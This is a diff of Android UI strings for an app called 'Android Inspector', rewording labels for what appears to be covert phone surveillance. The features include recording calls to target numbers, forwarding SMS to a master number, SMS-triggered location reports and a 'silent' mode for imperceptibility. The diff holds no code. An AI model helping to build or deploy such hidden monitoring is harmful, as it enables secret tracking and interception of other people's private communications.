@@ -59,18 +59,18 @@
     <string name="pref_category_sender_mail_key">pref_category_sender</string>
     <string name="pref_category_sender_mail_title">Mail Sender(Optional)</string>
     <string name="pref_category_receiver_key">pref_category_receiver</string>
-    <string name="pref_category_receiver_title">Receiver Info</string>
+    <string name="pref_category_receiver_title">Master Settings</string>
     <string name="pref_category_info_collector_key">pref_category_info_collector</string>
-    <string name="pref_category_info_collector_title">Collect Information</string>
+    <string name="pref_category_info_collector_title">Collection Setting</string>
     <string name="pref_category_record_title">Phone Call Recording</string>
     <string name="pref_category_sms_redirector_key">pref_category_sms_redirector</string>
-    <string name="pref_category_sms_redirector_title">SMS Redirection</string>
+    <string name="pref_category_sms_redirector_title">SMS Forwarding</string>
     <string name="pref_category_gps_key">pref_category_gps</string>
-    <string name="pref_category_gps_title">Get Location</string>
-    <string name="pref_category_ring_title">Ring</string>
+    <string name="pref_category_gps_title">Get Phone Location</string>
+    <string name="pref_category_ring_title">Belling</string>
     
     <string name="pref_use_self_sender_title">Use My Mail Sender</string>
-    <string name="pref_use_self_sender_summary">Use your own mail sender(GMail/QQ ONLY) for better privacy, otherwise will use system default mail sender. </string>
+    <string name="pref_use_self_sender_summary">Use your own mail sender(GMail/QQ ONLY) for better privacy protection, otherwise it will use system default mail sender.</string>
     <string name="pref_sender_mail_title">Mail Sender(GMail/QQ ONLY)</string>
     <string name="pref_sender_pwd_title">Password</string>
     <string name="pref_invalid_sender_mail">%s is not a valid mail sender</string>
@@ -81,10 +81,10 @@
     <string name="pref_info_interval_dlg_title">Get info interval</string>
     <string name="pref_record_all_title">Record all phone calls</string>
     <string name="pref_record_all_summary">Permitted only when using your own mail sender.</string>
-    <string name="pref_record_number_title">Target Number</string>
-    <string name="pref_pls_input_target_number">Please input one target number at least(4 digits at least).</string>
-    <string name="pref_record_number_summary">Record only when the phone call number contains the target number(at least 5 digits). Support 9 targets at most. Separate by blank space.</string>
-    <string name="pref_target_num_count_reach_max">9 target numbers at maximum, separate by blank space.</string>
+    <string name="pref_record_number_title">Target Number Segments</string>
+    <string name="pref_pls_input_target_number">Please input at least one target number segment(4 digits at least).</string>
+    <string name="pref_record_number_summary">Record only when the phone call number contains the target segment(at least 4 digits). Support 9 segments at maximum. Separate by blank space.</string>
+    <string name="pref_target_num_count_reach_max">9 target number segments at maximum, separate by blank space.</string>
     <string name="pref_target_num_format_error">ERROR: 4 digits per number at least.</string>
     <string name="pref_recv_phonenum_title">Master Phone Number</string>
     <string name="pref_pls_input_valid_recv_phonenum">ERROR: %s is not a valid mobile phone number.</string>
@@ -95,7 +95,7 @@
     <string name="pref_pls_input_sensitive_words">Please input sensitive words (separate by blank space).</string>
     <string name="pref_sensitive_words_count_reach_max">No more than %d sensitive words permitted, the surplus words will be ignored.</string>
     <string name="pref_gps_word_title">Location Command</string>
-    <string name="pref_gps_word_summary">Send SMS(#location) and then get back its location.</string>
+    <string name="pref_gps_word_summary">Send SMS(#location) to get back its location.</string>
     <string name="pref_category_network_mode_title">Network</string>
     <string name="pref_network_mode_title">Network Connection Mode</string>
     <string name="pref_network_mode_summary">Suggest to keep the default "silent" mode for imperceptibility.</string>
@@ -103,7 +103,7 @@
     <string name="pref_record_all_time_limit_in_trial">Only 10 times recording permitted in trial.</string>
     <string name="pref_must_use_self_sender">For protecting your privacy, recording all phone calls is permitted ONLY when using your own mail sender.</string>
     <string name="pref_ring_word_title">Force Belling</string>
-    <string name="pref_ring_word_summary">Send SMS(#bell) to force belling</string>
+    <string name="pref_ring_word_summary">Send SMS(#bell) to force belling.</string>
     
     <!-- InitActivity -->
     <string name="init_title">Android Inspector</string>
